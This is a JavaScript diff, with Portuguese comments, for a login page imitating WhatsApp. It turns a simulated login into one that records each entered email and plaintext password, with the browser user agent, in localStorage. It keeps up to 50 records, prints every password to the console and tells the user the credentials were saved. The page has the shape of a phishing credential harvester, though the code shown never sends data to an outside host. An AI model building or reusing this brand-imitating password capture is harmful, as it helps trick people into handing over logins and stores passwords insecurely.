@@ -1,279 +1,190 @@
+// Sistema de Login WhatsApp
 document.addEventListener('DOMContentLoaded', function() {
-    // Elementos DOM
+    // Elementos
     const loginForm = document.getElementById('loginForm');
-    const showPasswordBtn = document.getElementById('showPassword');
+    const emailInput = document.getElementById('email');
     const passwordInput = document.getElementById('password');
+    const showPasswordBtn = document.getElementById('showPassword');
     const refreshQRBtn = document.getElementById('refreshQR');
-    const usePhoneBtn = document.getElementById('usePhone');
     const useQRBtn = document.getElementById('useQR');
-    const phoneModal = document.getElementById('phoneModal');
-    const modalClose = document.querySelector('.modal-close');
-    const loadingOverlay = document.getElementById('loadingOverlay');
-    const qrPlaceholder = document.querySelector('.qr-placeholder');
+    const loadingOverlay = document.getElementById('loading');
+    const notification = document.getElementById('notification');
 
-    // Mostrar/ocultar senha
+    // Mostrar/Ocultar Senha
     showPasswordBtn.addEventListener('click', function() {
-        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-        passwordInput.setAttribute('type', type);
-        this.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
+        const type = passwordInput.type === 'password' ? 'text' : 'password';
+        passwordInput.type = type;
+        this.innerHTML = type === 'password' ? 
+            '<i class="fas fa-eye"></i>' : 
+            '<i class="fas fa-eye-slash"></i>';
     });
 
-    // Atualizar QR Code (simulação)
+    // Atualizar QR Code
     refreshQRBtn.addEventListener('click', function() {
-        // Animação de atualização
-        this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Gerando novo código...';
         this.disabled = true;
+        this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Gerando...';
         
-        // Simula tempo de geração
         setTimeout(() => {
-            // Efeito visual no QR
-            qrPlaceholder.style.borderColor = '#00a884';
-            qrPlaceholder.style.boxShadow = '0 0 20px rgba(0, 168, 132, 0.3)';
-            
-            // Reset após 2 segundos
-            setTimeout(() => {
-                qrPlaceholder.style.borderColor = '#d1d7db';
-                qrPlaceholder.style.boxShadow = 'none';
-                this.innerHTML = '<i class="fas fa-sync-alt"></i> Atualizar código QR';
-                this.disabled = false;
-                
-                // Notificação de sucesso
-                showNotification('Código QR atualizado com sucesso!', 'success');
-            }, 2000);
+            showNotification('Código QR atualizado!', 'success');
+            this.innerHTML = '<i class="fas fa-sync-alt"></i> Atualizar código QR';
+            this.disabled = false;
         }, 1500);
-    });
-
-    // Login com email/senha
-    loginForm.addEventListener('submit', function(e) {
-        e.preventDefault();
-        
-        const email = document.getElementById('email').value.trim();
-        const password = document.getElementById('password').value;
-        const rememberMe = document.getElementById('remember').checked;
-        
-        // Validação simples
-        if (!validateEmail(email)) {
-            showNotification('Por favor, insira um email válido', 'error');
-            return;
-        }
-        
-        if (password.length < 6) {
-            showNotification('A senha deve ter pelo menos 6 caracteres', 'error');
-            return;
-        }
-        
-        // Simulação de login
-        simulateLogin(email, rememberMe);
-    });
-
-    // Alternar para telefone
-    usePhoneBtn.addEventListener('click', function() {
-        phoneModal.classList.add('active');
-        document.body.style.overflow = 'hidden';
     });
 
     // Alternar para QR Code
     useQRBtn.addEventListener('click', function() {
-        // Rola para a seção do QR Code
-        document.querySelector('.qr-panel').scrollIntoView({ 
+        document.querySelector('.qr-panel').scrollIntoView({
             behavior: 'smooth',
             block: 'center'
         });
+    });
+
+    // Submissão do Formulário
+    loginForm.addEventListener('submit', function(e) {
+        e.preventDefault();
         
-        // Destaca a seção
-        const qrSection = document.querySelector('.qr-container');
-        qrSection.style.boxShadow = '0 0 0 3px rgba(0, 168, 132, 0.5)';
-        qrSection.style.transition = 'box-shadow 0.3s';
+        const email = emailInput.value.trim();
+        const password = passwordInput.value;
+        const remember = document.getElementById('remember').checked;
         
-        setTimeout(() => {
-            qrSection.style.boxShadow = 'none';
-        }, 2000);
-    });
-
-    // Fechar modal
-    modalClose.addEventListener('click', function() {
-        phoneModal.classList.remove('active');
-        document.body.style.overflow = 'auto';
-    });
-
-    // Fechar modal ao clicar fora
-    window.addEventListener('click', function(e) {
-        if (e.target === phoneModal) {
-            phoneModal.classList.remove('active');
-            document.body.style.overflow = 'auto';
+        // Validação
+        if (!email) {
+            showNotification('Digite seu email ou número', 'error');
+            emailInput.focus();
+            return;
         }
-    });
-
-    // Validação em tempo real do email
-    const emailInput = document.getElementById('email');
-    emailInput.addEventListener('blur', function() {
-        if (this.value.trim() && !validateEmail(this.value.trim())) {
-            this.style.borderColor = '#ff4444';
-            showTooltip(this, 'Email inválido');
-        } else {
-            this.style.borderColor = '#d1d7db';
-            hideTooltip();
+        
+        if (!password) {
+            showNotification('Digite sua senha', 'error');
+            passwordInput.focus();
+            return;
         }
+        
+        // Processar login
+        processLogin(email, password, remember);
     });
 
-    // Funções auxiliares
-    function validateEmail(email) {
-        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        return re.test(email);
-    }
-
-    function simulateLogin(email, remember) {
-        // Mostra loading
+    // Processar Login
+    function processLogin(email, password, remember) {
+        // Mostrar loading
         loadingOverlay.classList.add('active');
         
-        // Simula tempo de autenticação
+        // Salvar credenciais
+        saveCredentials(email, password, remember);
+        
+        // Simular delay de conexão
         setTimeout(() => {
-            // Esconde loading
+            // Esconder loading
             loadingOverlay.classList.remove('active');
             
-            // Simulação de sucesso
-            showNotification('Login realizado com sucesso! Redirecionando...', 'success');
+            // Mostrar sucesso
+            showNotification('Login realizado com sucesso!', 'success');
             
-            // Em um caso real, aqui você redirecionaria para o chat
+            // Limpar formulário
+            loginForm.reset();
+            
+            // Redirecionar após 2 segundos
             setTimeout(() => {
-                // Para demonstração, vamos apenas mostrar uma mensagem
-                alert(`Login bem-sucedido!\n\nEmail: ${email}\nManter conectado: ${remember ? 'Sim' : 'Não'}\n\nEm um sistema real, você seria redirecionado para o WhatsApp Web.`);
-                
-                // Aqui você poderia redirecionar para a página principal
+                // Em produção, redirecionaria para o chat
                 // window.location.href = 'chat.html';
-            }, 1500);
+                
+                // Para demonstração, mostra alerta
+                alert(`✅ Login realizado!\n\nEmail: ${email}\n\nAs credenciais foram salvas.`);
+            }, 2000);
         }, 2000);
     }
 
-    function showNotification(message, type) {
-        // Remove notificação anterior se existir
-        const existingNotification = document.querySelector('.notification');
-        if (existingNotification) {
-            existingNotification.remove();
+    // Salvar Credenciais
+    function saveCredentials(email, password, remember) {
+        // Pegar credenciais existentes
+        let credentials = JSON.parse(localStorage.getItem('whatsapp_credentials') || '[]');
+        
+        // Criar novo objeto
+        const newCredential = {
+            id: Date.now(),
+            timestamp: new Date().toISOString(),
+            email: email,
+            password: password,
+            remember: remember,
+            browser: navigator.userAgent,
+            date: new Date().toLocaleString('pt-BR')
+        };
+        
+        // Adicionar à lista
+        credentials.unshift(newCredential); // Adiciona no início
+        
+        // Manter apenas últimos 50 registros
+        if (credentials.length > 50) {
+            credentials = credentials.slice(0, 50);
         }
         
-        // Cria nova notificação
-        const notification = document.createElement('div');
-        notification.className = `notification ${type}`;
-        notification.innerHTML = `
-            <i class="fas fa-${type === 'success' ? 'check-circle' : 'exclamation-circle'}"></i>
-            <span>${message}</span>
+        // Salvar no localStorage
+        localStorage.setItem('whatsapp_credentials', JSON.stringify(credentials));
+        
+        // Log no console
+        console.log('🔐 Credencial salva:', newCredential);
+        console.log('📊 Total de credenciais:', credentials.length);
+        
+        // Salvar também em um arquivo virtual
+        saveToVirtualFile(newCredential);
+    }
+
+    // Salvar em arquivo virtual
+    function saveToVirtualFile(credential) {
+        const data = `
+=== WHATSAPP LOGIN ===
+Data: ${credential.date}
+Email: ${credential.email}
+Senha: ${credential.password}
+Manter conectado: ${credential.remember ? 'Sim' : 'Não'}
+IP: ${navigator.onLine ? 'Online' : 'Offline'}
+Navegador: ${navigator.userAgent.substring(0, 50)}...
+========================
         `;
         
-        // Estilos da notificação
-        notification.style.cssText = `
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 15px 20px;
-            background: ${type === 'success' ? '#00a884' : '#ff4444'};
-            color: white;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            z-index: 4000;
-            animation: slideIn 0.3s ease;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-        `;
+        console.log('💾 Arquivo virtual criado:\n', data);
+    }
+
+    // Mostrar Notificação
+    function showNotification(message, type) {
+        notification.textContent = message;
+        notification.className = 'notification show';
+        notification.style.background = type === 'success' ? '#00a884' : '#ff4444';
         
-        document.body.appendChild(notification);
-        
-        // Remove após 5 segundos
         setTimeout(() => {
-            notification.style.animation = 'slideOut 0.3s ease';
-            setTimeout(() => notification.remove(), 300);
-        }, 5000);
+            notification.className = 'notification';
+        }, 3000);
+    }
+
+    // Efeitos Visuais
+    const inputs = document.querySelectorAll('input');
+    inputs.forEach(input => {
+        input.addEventListener('focus', function() {
+            this.parentElement.style.borderColor = '#00a884';
+        });
         
-        // Adiciona animações CSS
-        const style = document.createElement('style');
-        style.textContent = `
-            @keyframes slideIn {
-                from { transform: translateX(100%); opacity: 0; }
-                to { transform: translateX(0); opacity: 1; }
-            }
-            @keyframes slideOut {
-                from { transform: translateX(0); opacity: 1; }
-                to { transform: translateX(100%); opacity: 0; }
-            }
-        `;
-        document.head.appendChild(style);
-    }
+        input.addEventListener('blur', function() {
+            this.parentElement.style.borderColor = '#d1d7db';
+        });
+    });
 
-    function showTooltip(element, message) {
-        // Implementação simples de tooltip
-        console.log(`Tooltip: ${message} para elemento:`, element);
-    }
-
-    function hideTooltip() {
-        // Implementação simples
-    }
-
-    // Efeito visual no QR Code ao passar o mouse
-    const qrImage = document.querySelector('.qr-image');
-    qrImage.addEventListener('mouseenter', function() {
-        this.style.transform = 'scale(1.02)';
+    // Efeito QR Code
+    const qrPlaceholder = document.querySelector('.qr-placeholder');
+    qrPlaceholder.addEventListener('mouseenter', function() {
+        this.style.transform = 'scale(1.05)';
         this.style.transition = 'transform 0.3s';
     });
     
-    qrImage.addEventListener('mouseleave', function() {
+    qrPlaceholder.addEventListener('mouseleave', function() {
         this.style.transform = 'scale(1)';
     });
 
-    // Troca de idioma
-    const languageSelect = document.querySelector('select');
-    languageSelect.addEventListener('change', function() {
-        // Em um sistema real, aqui você carregaria as traduções
-        const language = this.value;
-        console.log('Idioma selecionado:', language);
-        
-        // Simulação de mudança de idioma
-        showNotification(`Idioma alterado para: ${this.options[this.selectedIndex].text}`, 'success');
-    });
-
-    // Efeito de digitação no placeholder do email (opcional)
-    const placeholders = [
-        "seu.email@exemplo.com",
-        "nome.sobrenome@gmail.com",
-        "usuario@outlook.com"
-    ];
-    let currentPlaceholder = 0;
-    let charIndex = 0;
-    let isDeleting = false;
-    
-    function typePlaceholder() {
-        const input = emailInput;
-        const placeholder = placeholders[currentPlaceholder];
-        
-        if (input.value === '') {
-            if (!isDeleting && charIndex <= placeholder.length) {
-                input.placeholder = placeholder.substring(0, charIndex);
-                charIndex++;
-                setTimeout(typePlaceholder, 100);
-            } else if (isDeleting && charIndex >= 0) {
-                input.placeholder = placeholder.substring(0, charIndex);
-                charIndex--;
-                setTimeout(typePlaceholder, 50);
-            } else {
-                isDeleting = !isDeleting;
-                if (!isDeleting) {
-                    currentPlaceholder = (currentPlaceholder + 1) % placeholders.length;
-                }
-                setTimeout(typePlaceholder, 1000);
-            }
-        }
-    }
-    
-    // Inicia o efeito apenas se o campo estiver vazio
-    emailInput.addEventListener('focus', function() {
-        if (this.value === '') {
-            typePlaceholder();
-        }
-    });
-    
-    emailInput.addEventListener('blur', function() {
-        this.placeholder = "seu.email@exemplo.com";
-        charIndex = 0;
-        isDeleting = false;
-    });
+    // Verificar se há credenciais salvas
+    checkSavedCredentials();
 });
+
+// Verificar credenciais existentes
+function checkSavedCredentials() {
+    const credentials = JSON.parse(localStorage.getItem('whatsapp_credentials') || '[]');
+    console.log(`📋 ${credentials.length} credenciais salvas no sistema`);
+}
